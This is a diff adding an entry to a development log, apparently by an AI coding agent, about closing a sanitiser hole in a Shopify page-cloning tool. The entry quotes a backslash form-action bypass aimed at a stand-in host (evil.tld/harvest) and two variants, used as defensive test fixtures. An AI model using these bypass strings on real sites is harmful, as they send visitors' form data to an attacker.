@@ -2690,3 +2690,62 @@ link is absolutized. All three were re-anchored and mutation-checked
 (DECISION MADE).
 STATUS: COMPLETE
 ---
+
+---
+TIMESTAMP: 2026-08-10 00:20
+TASK: Clone-from-Shopify — delta re-verify, final gate (2 new findings in the shared cleaner)
+BUILT: Both new gating items closed inside pageClone.js, plus the two nits.
+G1 (form-action bypass): the off-site test was a forward-slash-only regex, so
+<form action="\\evil.tld/harvest"> cleared it with forms_neutralized=0 while
+every browser resolves that string to https://evil.tld/harvest — visitor form
+data exfiltrating from a page we serve. Reproduced verbatim before the fix.
+The decision is now made by the URL PARSER: a new exported resolvedHost() /
+isOffsiteUrl() pair resolves the value against the https://relative.invalid
+sentinel base (the same parse iframeHost already used) and calls it off-site
+when the resulting hostname is neither empty nor the sentinel. That also
+catches two variants the report did not name — /\evil.tld/x and \/evil.tld/x —
+which the old regex cleared too, while /local, \local, ?q=1 and '' stay
+on-site. G2 (cleaner perf): the per-attribute-per-tag `new RegExp` made
+cleanHtml 1,109 ms for a 10MB / ~414k-tag document — the same event-loop-block
+class as B1 but on POST /page-clone/scan, reachable from paste and upload. The
+nine attribute names are folded into ONE module-scope alternation
+(UNSAFE_URL_ATTR_RE), and FORM_TAG_RE / FORM_ACTION_RE are hoisted too, which
+also collapses nine passes over each tag's attributes into one: re-measured at
+193-203 ms. NITS: a row past the derivation budget now reports
+is_theme_built: null ("not derived") instead of false, because false is a
+positive claim that the page has content; and storefrontBase() gained
+{retryDegraded} so an IMPORT never inherits a degraded myshopify-fallback
+answer — the list may reuse it for its 60s window because it is ephemeral, but
+an import's live_url is what absolutizes asset paths and those absolute URLs
+are SAVED into the page's blocks, so a degraded answer would bake the wrong
+canonical host into a page permanently.
+TESTED: shopify-import 353 -> 382 assertions, 382/382. New coverage: 12
+isOffsiteUrl cases incl. all three backslash authority forms and the
+same-origin negatives, resolvedHost proving the host comes from the parser;
+the backslash form asserted end-to-end through /import (forms_neutralized=1,
+no live action attribute, data-original-action kept, form survives); a PINNED
+cleanHtml budget of 600ms at the real 10MB INPUT_MAX ceiling, asserted the way
+LIST_BODY_BUDGET_BYTES is, plus two assertions that the pass is still doing
+the work rather than short-circuiting to look fast (all-zero counters on clean
+input, and a needle found buried in 400 clean tags); the budget backstop
+emitting null and no invented summary; and the degraded-memo split (list
+reuses, every import re-attempts, a healthy answer is memoised for imports too
+and yields the canonical domain). Regressions: scan-create 92/92 and
+variant-search 94/94, both still identical to the pre-change baseline.
+node --check on all four server files OK; eslint 0 errors; vite build exit 0;
+mount re-verified at 401 for both shopify-pages routes and page-clone/scan.
+OUTPUT: 382/382 + 92/92 + 94/94; build exit 0; eslint exit 0. G1
+forms_neutralized 0 -> 1 on the backslash fixture. G2 1,109ms -> 203ms at
+INPUT_MAX.
+DECISIONS: (1) The off-site decision is now shared with the iframe allowlist
+through one resolvedHost(), so the two guards can no longer disagree about
+what "off-site" means (DECISION MADE). (2) The cleanHtml budget is pinned at
+600ms against a measured 203ms — roughly 3x headroom, loose enough not to
+flake on a loaded machine and tight enough to catch the 5-20x regression class
+this finding belongs to (DECISION MADE). (3) The degraded-import re-attempt
+costs one extra Admin call per import, but ONLY while /shop.json is actually
+failing, and it stays inside the rate limiter — chosen over shrinking the
+failure TTL globally, which would have restored the per-request fan-out on the
+list that the memo exists to prevent (DECISION MADE).
+STATUS: COMPLETE
+---
